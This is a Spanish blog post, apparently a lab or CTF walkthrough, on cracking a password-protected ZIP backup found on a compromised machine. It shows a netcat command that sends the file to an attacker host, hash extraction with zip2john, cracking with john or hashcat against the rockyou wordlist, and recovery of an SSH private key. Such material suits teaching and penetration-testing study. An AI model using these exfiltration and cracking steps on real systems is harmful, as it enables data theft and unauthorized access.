---
date: 2023-03-12T22:25:05.000Z
layout: post
comments: true
title: ZIP cracking
subtitle: 'técnica de recuperación'
description: >-
image: >-
    http://imgfz.com/i/onKZRPH.png
optimized_image: >-
    http://imgfz.com/i/onKZRPH.png
category: ciberseguridad
tags: 
  - hacking
  - Wireshark
  - hashcat
  - john
  - zip2john
author: Felipe Canales Cayuqueo
paginate: true
---

Es el proceso de intentar recuperar la contraseña de un archivo zip cifrado sin tener que conocerla. Se realiza mediante el uso de herramientas de cracking que intentan diferentes combinaciones de contraseñas hasta encontrar la correcta.

### Ejemplo práctico

En este caso tenemos el caso de una máquina víctima en que se ingresó desde una web y se detecta un backup para acceder como un usuario:

```bash
www-data@user:/var/backups$ ls
alternatives.tar.0     alternatives.tar.2.gz  dpkg.arch.0     dpkg.arch.2.gz	 dpkg.diversions.1.gz  dpkg.statoverride.0     dpkg.statoverride.2.gz  dpkg.status.1.gz  user_backup.zip
alternatives.tar.1.gz  apt.extended_states.0  dpkg.arch.1.gz  dpkg.diversions.0  dpkg.diversions.2.gz  dpkg.statoverride.1.gz  dpkg.status.0	       dpkg.status.2.gz
```

Nos enviamos el zip a la máquina atacante por medio de netcat:

```bash
www-data@user:/var/backups$ nc 10.1.1.19 4646 < user_backup.zip 
```

Y lo recibimos en la máquina de la siguiente forma:

```bash
┌─[root@kali]─[/home/user/zip]
└──╼ nc -nlvp 4646 > user_backup.zip    
listening on [any] 4646 ...
connect to [10.1.1.19] from (UNKNOWN) [10.1.1.40] 56460
^C

┌─[root@kali]─[/home/user/zip]
└──╼ ls
user_backup.zip
```

Una vez lo tenemos en nuestra máquina atacante, verificamos abrirlo:

```bash
┌─[root@kali]─[/home/user/zip]
└──╼ unzip user_backup.zip        
Archive:  user_backup.zip
[user_backup.zip] id_rsa password: 
   skipping: id_rsa                  incorrect password
   skipping: id_rsa.pub              incorrect password
   skipping: my_password.txt         incorrect password
   skipping: easysysinfo.c           incorrect password
```

Ahora necesitamos obtener un hash del archivo zip por medio de la herramienta ```zip2john```, incluida en el paquete John the Ripper que permite extraer el hash de contraseñas de archivos zip.

```bash
┌─[root@kali]─[/home/user/zip]
└──╼ zip2john user_backup.zip > hash
ver 2.0 efh 5455 efh 7875 user_backup.zip/id_rsa PKZIP Encr: TS_chk, cmplen=1979, decmplen=2590, crc=A144E09A ts=0298 cs=0298 type=8
ver 2.0 efh 5455 efh 7875 user_backup.zip/id_rsa.pub PKZIP Encr: TS_chk, cmplen=470, decmplen=563, crc=41C30277 ts=029A cs=029a type=8
ver 1.0 efh 5455 efh 7875 ** 2b ** user_backup.zip/my_password.txt PKZIP Encr: TS_chk, cmplen=35, decmplen=23, crc=21E9B663 ts=02BA cs=02ba type=0
ver 2.0 efh 5455 efh 7875 user_backup.zip/easysysinfo.c PKZIP Encr: TS_chk, cmplen=115, decmplen=148, crc=A256BBD9 ts=0170 cs=0170 type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.

┌─[root@kali]─[/home/user/zip]
└──╼ cat hash  
user_backup.zip:$pkzip$4*1*1*0*8*24*0170*ec4fd2b0aa20f56edb8a937f1139b2d2629a0cae87a5fc2350b0c4162c0c397334b2d3ad*1*0*8*24*029a*7bf140f80a405c4cf07debe3636404195407270f1d414555d6dc8b670dfd98659a733cb0*1*0*8*24*0298*625ef25ed71ddc48eaa744529308a8ccb41ce3deb3d707da114f2fb6f56de89adc7060e4*2*0*23*17*21e9b663*a35*49*0*23*02ba*9c8949619fb53f6d8f1f200bfedaf3321542d0d588aca8f8a1c5da5113463a151a5058*$/pkzip$::user_backup.zip:my_password.txt, easysysinfo.c, id_rsa.pub, id_rsa:user_backup.zip
```

Una vez obtenemos el hash, los crackeamos por medio de ```john```:

```bash
┌─[root@kali]─[/home/user/zip]
└──╼ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!randybaby       (user_backup.zip)     
1g 0:00:00:04 DONE (2023-03-04 19:31) 0.2293g/s 3289Kp/s 3289Kc/s 3289KC/s "2parrow"..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Para hashcat se podría realizar lo siguiente:

```bash
hashcat.exe -m 17200 -a 0 -o output.txt --force --potfile-disable hash.txt rockyou.txt
```

Detectamos que la contraseña es ```!randybaby``` y la probamos para acceder:


```bash
┌─[root@kali]─[/home/user/zip]
└──╼ unzip user_backup.zip 
Archive:  user_backup.zip
[user_backup.zip] id_rsa password: 
  inflating: id_rsa                  
  inflating: id_rsa.pub              
 extracting: my_password.txt         
  inflating: easysysinfo.c 

┌─[root@kali]─[/home/user/zip]
└──╼ ls
hash  id_rsa  id_rsa.pub  my_password.txt  user_backup.zip

```

Como se aprecia obtenemos acceso y podemos observar los archivos de la contraseña y del id_rsa, que se podría usar dando los privilegios adecuados ```chmod 600 id_rsa```.


